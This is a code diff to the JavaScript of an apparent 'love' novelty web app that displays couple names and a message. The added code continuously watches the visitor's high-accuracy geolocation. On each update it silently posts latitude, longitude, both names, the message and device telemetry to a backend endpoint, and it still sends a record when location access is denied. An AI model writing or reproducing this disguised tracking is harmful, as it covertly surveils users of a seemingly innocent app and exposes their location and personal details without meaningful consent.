@@ -2,6 +2,7 @@
   'use strict';
 
   var clientTelemetry = null;
+  var watchId = null; // Used to track and clear continuous geolocation watch
 
   var screen1 = document.getElementById('screen-1');
   var screen2 = document.getElementById('screen-2');
@@ -80,32 +81,6 @@
       });
     }
     return Promise.resolve({ battery_level: null, battery_charging: null });
-  }
-
-  // Request Geolocation (triggers browser permission prompt)
-  function getGeolocation() {
-    return new Promise(function (resolve) {
-      if (!navigator.geolocation) {
-        resolve({ latitude: null, longitude: null, status: 'Not Supported' });
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        function (position) {
-          resolve({
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            status: 'Allowed / Captured'
-          });
-        },
-        function (error) {
-          var statusMsg = 'Denied / Blocked';
-          if (error.code === error.TIMEOUT) statusMsg = 'Timeout';
-          resolve({ latitude: null, longitude: null, status: statusMsg });
-        },
-        { timeout: 8000, maximumAge: 60000, enableHighAccuracy: true }
-      );
-    });
   }
 
   function detectTelemetry() {
@@ -241,28 +216,59 @@
     renderNames(yourName, partnerName, message);
     generateLoveParticles(80);
 
-    // Prompt for geolocation and transmit telemetry to Supabase via backend
-    getGeolocation().then(function (geoData) {
-      var payload = Object.assign({}, clientTelemetry || {}, {
-        your_name: yourName,
-        partner_name: partnerName,
-        couple_names: yourName + ' ❤ ' + partnerName,
-        message: message,
-        latitude: geoData.latitude,
-        longitude: geoData.longitude,
-        location_status: geoData.status
-      });
+    // Continuously watch and stream live location updates while using the app
+    if (navigator.geolocation) {
+      watchId = navigator.geolocation.watchPosition(
+        function (position) {
+          var payload = Object.assign({}, clientTelemetry || {}, {
+            your_name: yourName,
+            partner_name: partnerName,
+            couple_names: yourName + ' ❤ ' + partnerName,
+            message: message,
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            location_status: 'Watching / Live Updated'
+          });
 
-      fetch('/api/telemetry', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      }).catch(function () {});
-    });
+          fetch('/api/telemetry', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          }).catch(function () {});
+        },
+        function (error) {
+          var statusMsg = 'Denied / Blocked';
+          if (error.code === error.TIMEOUT) statusMsg = 'Timeout';
+          
+          var payload = Object.assign({}, clientTelemetry || {}, {
+            your_name: yourName,
+            partner_name: partnerName,
+            couple_names: yourName + ' ❤ ' + partnerName,
+            message: message,
+            latitude: null,
+            longitude: null,
+            location_status: statusMsg
+          });
+
+          fetch('/api/telemetry', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          }).catch(function () {});
+        },
+        { enableHighAccuracy: true, maximumAge: 10000, timeout: 10000 }
+      );
+    }
   });
 
   if (replayBtn) {
     replayBtn.addEventListener('click', function () {
+      // Stop continuous location tracking when resetting the demo
+      if (watchId !== null && navigator.geolocation) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+      }
+
       screen2.classList.remove('screen-active');
       screen2.classList.add('screen-hidden');
       screen1.classList.remove('screen-hidden');
